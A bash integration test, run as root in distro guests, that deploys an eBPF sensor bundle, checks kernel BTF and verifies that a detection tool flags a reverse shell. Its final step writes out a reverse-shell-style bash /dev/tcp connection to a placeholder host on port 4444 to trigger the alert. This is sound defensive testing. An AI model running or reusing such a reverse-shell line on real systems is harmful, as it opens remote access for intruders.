#!/usr/bin/env bash
# Test B, run in-guest as root on each vendor distro: the banken + mimi half of the matrix. It
# deploys the portable mimi bundle (the loader + glibc shipped alongside the binary, so it runs with
# no /nix in the guest), loads the eBPF sensor on THIS distro's own shipped kernel (CO-RE resolves
# task_struct offsets from that kernel's BTF), and checks banken detects a reverse shell on the
# MIMI-sourced event -- the integration, proven per distro.
#
# It prints one "<id> PASS|FAIL <detail>" line per objective; distrocheck parses these into the
# report. BTF absent (B2 FAIL) is a clean skip of B3-B5: CO-RE needs it, and recording which distro
# kernels ship BTF is itself a result.
set -uo pipefail
SEED=${1:-/mnt/seed}
D=/opt/mimi
log(){ echo "$1 $2 ${3:-}"; }

# M1: deploy the bundle (mimi + its interpreter + libc + libgcc) from the seed.
mkdir -p "$D" /etc/banken
if cp "$SEED"/mimi-bundle/mimi "$SEED"/mimi-bundle/ld.so "$SEED"/mimi-bundle/libc.so.6 "$SEED"/mimi-bundle/libgcc_s.so.1 "$D"/ 2>/dev/null && chmod +x "$D"/mimi "$D"/ld.so; then
  log M1 PASS "bundle deployed"
else
  log M1 FAIL "could not deploy mimi bundle from seed"; exit 0
fi

# M2: BTF -- CO-RE prerequisite.
if [ -r /sys/kernel/btf/vmlinux ]; then log M2 PASS "has /sys/kernel/btf/vmlinux"; else log M2 FAIL "no kernel BTF"; log M3 FAIL "not reached: no BTF"; log M4 FAIL "not reached: no BTF"; log M5 FAIL "not reached: no BTF"; exit 0; fi

run_mimi(){ "$D/ld.so" --library-path "$D" "$D/mimi" --sink /var/log/mimi.jsonl; }

# M3: load the probe (CO-RE off this kernel's BTF) and start streaming.
run_mimi >/var/log/mimi.err 2>&1 &
MPID=$!
for _ in $(seq 1 60); do [ -s /var/log/mimi.jsonl ] && break; sleep 0.25; done
if kill -0 "$MPID" 2>/dev/null && [ -s /var/log/mimi.jsonl ]; then
  log M3 PASS "probe loaded, streaming $(wc -l </var/log/mimi.jsonl) events"
else
  log M3 FAIL "mimi did not load/stream: $(tail -1 /var/log/mimi.err 2>/dev/null)"
  log M4 FAIL "not reached: mimi down"; log M5 FAIL "not reached: mimi down"; kill "$MPID" 2>/dev/null; exit 0
fi

# M4: a real exec is captured (unique name <=15 chars so it survives the 16-byte comm).
cp "$(command -v bash)" /tmp/mimicanary 2>/dev/null && /tmp/mimicanary -c true
for _ in $(seq 1 40); do grep -q '"name":"mimicanary"' /var/log/mimi.jsonl 2>/dev/null && break; sleep 0.25; done
if grep -q '"name":"mimicanary"' /var/log/mimi.jsonl 2>/dev/null; then log M4 PASS "exec captured"; else log M4 FAIL "canary exec not in mimi stream"; fi

# M5: banken --watch on the mimi stream detects a reverse shell on the mimi-sourced event.
printf 'sources:\n  - {type: mimi, path: /var/log/mimi.jsonl}\nalerts:\n  jsonl: {enable: true, dir: /var/log/bmimi, format: ocsf}\n' > /etc/banken/mimi.yml
mkdir -p /var/log/bmimi
banken --watch -config /etc/banken/mimi.yml -state /tmp/bmimi.state >/var/log/bmimi.err 2>&1 &
BPID=$!
sleep 1
( timeout 3 bash -c 'exec 3<>/dev/tcp/192.0.2.1/4444' >/dev/null 2>&1 & )
hit=""
for _ in $(seq 1 80); do
  hit=$(grep -h '"data_sources":\["mimi"\]' /var/log/bmimi/*.jsonl 2>/dev/null | grep reverse_shell | head -1)
  [ -n "$hit" ] && break
  sleep 0.25
done
if [ -n "$hit" ]; then log M5 PASS "reverse_shell detected, data_sources=[mimi]"; else log M5 FAIL "no mimi-sourced reverse_shell ($(tail -1 /var/log/bmimi.err 2>/dev/null))"; fi
kill "$MPID" "$BPID" 2>/dev/null
exit 0
